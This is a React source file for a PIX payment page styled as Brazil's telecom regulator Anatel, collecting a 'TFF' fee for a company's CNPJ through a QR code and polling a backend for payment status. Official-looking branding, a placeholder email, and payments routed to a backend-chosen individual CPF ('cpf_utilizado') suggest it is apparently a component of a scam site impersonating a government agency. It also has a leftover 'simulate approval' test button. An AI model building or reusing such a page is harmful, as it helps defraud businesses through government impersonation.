import React, { useState, useEffect, useRef } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import axios from 'axios';
import { QRCode } from 'react-qrcode-logo';
import { Button } from '@/components/ui/button';
import { Card, CardContent } from '@/components/ui/card';
import AnatelHeader from '@/components/AnatelHeader';
import AnatelFooter from '@/components/AnatelFooter';
import { Copy, CheckCircle2, Clock, Shield } from 'lucide-react';
import { toast } from 'sonner';

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
const API = `${BACKEND_URL}/api`;

const AnatelPagamentoPage = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const [dadosEmpresa, setDadosEmpresa] = useState(null);
  const [taxas, setTaxas] = useState(null);
  const [pagamento, setPagamento] = useState(null);
  const [loading, setLoading] = useState(false);
  const [copiado, setCopiado] = useState(false);
  const pixGeradoRef = useRef(false);

  useEffect(() => {
    if (pixGeradoRef.current) return;
    pixGeradoRef.current = true;

    const dados = location.state?.dadosEmpresa;
    const taxasData = location.state?.taxas;

    if (!dados || !taxasData) {
      toast.error('Dados não encontrados');
      navigate('/anatel');
      return;
    }

    setDadosEmpresa(dados);
    setTaxas(taxasData);
    
    const cpfAnterior = location.state?.cpfAnterior;
    gerarPix(dados, taxasData, cpfAnterior);
  }, []);

  const gerarPix = async (empresa, taxasData, cpfAnterior = null) => {
    setLoading(true);

    try {
      let response;
      
      if (cpfAnterior) {
        response = await axios.post(`${API}/pagamento/pix-2026`, {
          cnpj: empresa.cnpj,
          nome: empresa.nome,
          email: 'contato@empresa.com',
          valor: taxasData.total,
          cpf_anterior: cpfAnterior
        });
      } else {
        response = await axios.post(`${API}/pagamento/pix`, {
          cnpj: empresa.cnpj,
          nome: empresa.nome,
          email: 'contato@empresa.com',
          valor: taxasData.total
        });
      }

      setPagamento(response.data);
      toast.success('QR Code gerado!');
      iniciarMonitoramento(response.data.id, response.data.cpf_utilizado);
    } catch (error) {
      console.error('Erro ao gerar PIX:', error);
      toast.error('Erro ao gerar PIX');
    } finally {
      setLoading(false);
    }
  };

  const simularAprovacao = async () => {
    if (!pagamento?.id) return;
    
    try {
      await axios.post(`${API}/pagamento/simular-aprovacao/${pagamento.id}`);
      toast.success('Pagamento aprovado!');
      
      const isExercicio2026 = location.state?.exercicio2026;
      
      setTimeout(() => {
        if (isExercicio2026) {
          navigate('/anatel/em-dia', {
            state: { cnpj: dadosEmpresa?.cnpj, dadosEmpresa }
          });
        } else {
          navigate('/anatel/confirmacao', {
            state: {
              valor: taxas?.total,
              cnpj: dadosEmpresa?.cnpj,
              dadosEmpresa,
              cpfUtilizado: pagamento?.cpf_utilizado
            }
          });
        }
      }, 1000);
    } catch (error) {
      console.error('Erro:', error);
      toast.error('Erro ao processar');
    }
  };

  const iniciarMonitoramento = (transactionId, cpfUtilizado) => {
    const isExercicio2026 = location.state?.exercicio2026;
    
    const interval = setInterval(async () => {
      try {
        const response = await axios.get(`${API}/pagamento/status/${transactionId}`);
        const status = response.data.status;

        if (status === 'paid' || status === 'approved' || status === 'CONFIRMED') {
          clearInterval(interval);
          toast.success('Pagamento confirmado!');
          setTimeout(() => {
            if (isExercicio2026) {
              navigate('/anatel/em-dia', {
                state: { cnpj: dadosEmpresa?.cnpj, dadosEmpresa }
              });
            } else {
              navigate('/anatel/confirmacao', {
                state: {
                  valor: taxas?.total,
                  cnpj: dadosEmpresa?.cnpj,
                  dadosEmpresa,
                  cpfUtilizado
                }
              });
            }
          }, 1500);
        }
      } catch (error) {
        console.error('Erro ao verificar status:', error);
      }
    }, 10000);

    setTimeout(() => clearInterval(interval), 30 * 60 * 1000);
  };

  const copiarCodigo = () => {
    if (pagamento?.qr_code) {
      navigator.clipboard.writeText(pagamento.qr_code);
      setCopiado(true);
      toast.success('Código copiado!');
      setTimeout(() => setCopiado(false), 3000);
    }
  };

  const formatarValor = (v) => {
    return new Intl.NumberFormat('pt-BR', {
      style: 'currency',
      currency: 'BRL'
    }).format(v || 0);
  };

  const isExercicio2026 = location.state?.exercicio2026;

  return (
    <div className="min-h-screen flex flex-col bg-[#f0f4f8]">
      <AnatelHeader />

      <main className="flex-1 py-6">
        <div className="max-w-lg mx-auto px-4">
          
          {/* Header */}
          <div className="text-center mb-6">
            <h1 className="text-xl font-bold text-[#071D41]">Pagamento PIX</h1>
            <p className="text-sm text-gray-500">
              TFF {isExercicio2026 ? '2026' : '2025'}
            </p>
          </div>

          {/* Card Pagamento */}
          <Card className="bg-white border-0 shadow-lg mb-4">
            <CardContent className="p-5">
              
              {/* Valor */}
              <div className="text-center mb-5">
                <p className="text-xs text-gray-500 mb-1">Valor a pagar</p>
                <p className="text-3xl font-bold text-[#071D41]">
                  {formatarValor(taxas?.total)}
                </p>
              </div>

              {/* QR Code */}
              {loading ? (
                <div className="flex items-center justify-center py-10">
                  <div className="text-center">
                    <div className="w-8 h-8 border-3 border-[#1351b4]/30 border-t-[#1351b4] rounded-full animate-spin mx-auto mb-3"></div>
                    <p className="text-gray-500 text-sm">Gerando QR Code...</p>
                  </div>
                </div>
              ) : pagamento?.qr_code ? (
                <div className="flex flex-col items-center">
                  <div className="bg-white p-3 rounded-xl shadow-sm border border-gray-200 mb-4">
                    <QRCode
                      value={pagamento.qr_code}
                      size={180}
                      quietZone={10}
                      bgColor="#FFFFFF"
                      fgColor="#071D41"
                    />
                  </div>

                  {/* Copiar código */}
                  <Button
                    onClick={copiarCodigo}
                    variant="outline"
                    className="w-full border-[#1351b4] text-[#1351b4] hover:bg-[#1351b4] hover:text-white mb-4 cursor-pointer"
                  >
                    {copiado ? (
                      <span className="flex items-center gap-2">
                        <CheckCircle2 className="w-4 h-4" />
                        Copiado!
                      </span>
                    ) : (
                      <span className="flex items-center gap-2">
                        <Copy className="w-4 h-4" />
                        Copiar código PIX
                      </span>
                    )}
                  </Button>

                  {/* Status */}
                  <div className="w-full bg-[#fff3cd] border border-[#ffc107] rounded-lg p-3 flex items-center gap-2">
                    <Clock className="w-4 h-4 text-[#856404]" />
                    <span className="text-sm text-[#856404]">Aguardando pagamento...</span>
                  </div>
                </div>
              ) : (
                <div className="text-center py-10">
                  <p className="text-gray-500">Erro ao gerar QR Code</p>
                </div>
              )}
            </CardContent>
          </Card>

          {/* Botão de Simulação - REMOVER EM PRODUÇÃO */}
          {pagamento && (
            <Button
              onClick={simularAprovacao}
              className="w-full bg-orange-500 hover:bg-orange-600 text-white font-semibold h-12 mb-4 cursor-pointer"
            >
              🧪 SIMULAR APROVAÇÃO
            </Button>
          )}

          {/* Segurança */}
          <div className="flex items-center justify-center gap-2 text-gray-400">
            <Shield className="w-4 h-4" />
            <span className="text-xs">Pagamento seguro via PIX</span>
          </div>
        </div>
      </main>

      <AnatelFooter />
    </div>
  );
};

export default AnatelPagamentoPage;
